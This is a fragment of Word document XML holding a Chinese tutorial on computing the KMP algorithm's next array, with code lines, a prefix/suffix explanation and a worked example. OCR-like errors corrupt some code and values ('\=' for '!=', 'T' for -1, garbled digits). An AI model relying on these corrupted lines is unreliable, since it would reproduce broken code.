          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">while (k &gt; -1 &amp;&amp; str[k </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">+ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>1] \= str[q])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="1680" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">k </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">= </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>next [k]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>; //往前回溯</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1260" w:right="0" w:firstLine="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30" w:lineRule="exact"/>
        <w:ind w:left="1260" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">if (str [k </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">+ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>1] == str [q])//jn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>果相同，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>k++ [</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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k = k + 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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940" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1260" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>next[q] = k;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="322" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>理解</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="420"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>这里是用被包含的较短字符串，自己与自己匹配，求得</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>next</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>数组，然后再进行算法的 后续步骤。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="322" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="420"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>next</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">数组中储存的是这个字符串前缀和后缀中相同字符串的最长长度。比如 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>abcdefgabc,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>前缀和后缀相同的是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>abc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>,长度是3。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="322" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="420"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>next [i]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>储存的是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>string</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中前</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>i+1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>位字符串前缀和后缀的最长长度。如</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">abadefg,next [2] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>存的是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>aba</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>这个字符串前缀和后缀的最长长度。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="420"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>但是这里为了和代码相对应，将</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>定义为相同长度为。，。定义为相同长度为1,…… 依次类推</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="180" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="420"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>这里用一个比较明显的字符串</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>abababac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>来做例子，先创建一个和字符串长度相同的数 组</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>next。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>第一位设为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>T。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="1000"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">-A </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">B </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>~C ~D~~ E</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> F </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">丨 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>G I H I J</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="945"/>
          <w:tab w:val="left" w:pos="2265"/>
          <w:tab w:val="left" w:pos="2685"/>
          <w:tab w:val="left" w:pos="3075"/>
          <w:tab w:val="left" w:pos="3480"/>
          <w:tab w:val="left" w:pos="4605"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="660"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="28" w:name="bookmark31"/>
      <w:bookmarkEnd w:id="28"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>index 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4 5 6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>7_</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="945"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="660"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="29" w:name="bookmark32"/>
      <w:bookmarkEnd w:id="29"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>str： abababac</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="945"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="660"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="30" w:name="bookmark33"/>
      <w:bookmarkEnd w:id="30"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>next： -1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:line="1" w:lineRule="exact"/>
        <w:sectPr>
          <w:headerReference r:id="rId9" w:type="default"/>
          <w:headerReference r:id="rId10" w:type="even"/>
          <w:footnotePr>
            <w:numFmt w:val="decimal"/>
          </w:footnotePr>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1805" w:right="1712" w:bottom="1880" w:left="1772" w:header="0" w:footer="1452" w:gutter="0"/>
          <w:cols w:space="720" w:num="1"/>
          <w:rtlGutter w:val="0"/>
          <w:docGrid w:linePitch="360" w:charSpace="0"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="431800" distB="819150" distL="0" distR="0" simplePos="0" relativeHeight="125830144" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>1391920</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>431800</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="1495425" cy="171450"/>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1495425" cy="1714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所以向后移一位开始比较</w:t>
                            </w:r>
                          </w:p>
                        </w:txbxContent>
                      </wps:txbx>
                      <wps:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0">
                        <a:noAutofit/>
                      </wps:bodyPr>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:shape id="Shape 9" o:spid="_x0000_s1026" o:spt="202" type="#_x0000_t202" style="position:absolute;left:0pt;margin-left:109.6pt;margin-top:34pt;height:13.5pt;width:117.75pt;mso-position-horizontal-relative:page;mso-wrap-distance-bottom:64.5pt;mso-wrap-distance-top:34pt;mso-wrap-style:none;z-index:125830144;mso-width-relative:page;mso-height-relative:page;" filled="f" stroked="f" coordsize="21600,21600" o:gfxdata="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eGe3g1wAA&#10;AAkBAAAPAAAAAAAAAAEAIAAAACIAAABkcnMvZG93bnJldi54bWxQSwECFAAUAAAACACHTuJAxWGP&#10;La0BAABwAwAADgAAAAAAAAABACAAAAAmAQAAZHJzL2Uyb0RvYy54bWxQSwUGAAAAAAYABgBZAQAA&#10;RQ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所以向后移一位开始比较</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="660400" distB="0" distL="0" distR="0" simplePos="0" relativeHeight="125830144" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>1515745</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>660400</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="1247775" cy="762000"/>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1247775" cy="7620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540"/>
                              <w:jc w:val="left"/>
                            </w:pPr>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>ABC</w:t>
                            </w:r>
                          </w:p>
                          <w:p>
                            <w:pPr>
                              <w:pStyle w:val="11"/>
                              <w:keepNext w:val="0"/>
                              <w:keepLines w:val="0"/>
                              <w:widowControl w:val="0"/>
                              <w:numPr>
                                <w:ilvl w:val="0"/>
                                <w:numId w:val="3"/>
                              </w:numPr>
                              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                              <w:tabs>
                                <w:tab w:val="left" w:pos="300"/>
                                <w:tab w:val="left" w:pos="1065"/>
                                <w:tab w:val="left" w:pos="1560"/>
                              </w:tabs>
                              <w:bidi w:val="0"/>
                              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                              <w:ind w:left="0" w:right="0" w:firstLine="0"/>
                              <w:jc w:val="left"/>
                            </w:pPr>
                            <w:bookmarkStart w:id="324" w:name="bookmark28"/>
                            <w:bookmarkEnd w:id="324"/>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>index</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p>
                          <w:p>
                            <w:pPr>
                              <w:pStyle w:val="11"/>
                              <w:keepNext w:val="0"/>
                              <w:keepLines w:val="0"/>
                              <w:widowControl w:val="0"/>
                              <w:numPr>
                                <w:ilvl w:val="0"/>
                                <w:numId w:val="3"/>
                              </w:numPr>
                              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                              <w:tabs>
                                <w:tab w:val="left" w:pos="285"/>
                              </w:tabs>
                              <w:bidi w:val="0"/>
                              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                              <w:ind w:left="0" w:right="0" w:firstLine="0"/>
                              <w:jc w:val="left"/>
                            </w:pPr>
                            <w:bookmarkStart w:id="325" w:name="bookmark29"/>
                            <w:bookmarkEnd w:id="325"/>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>str</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                              </w:rPr>
                              <w:t xml:space="preserve">: </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
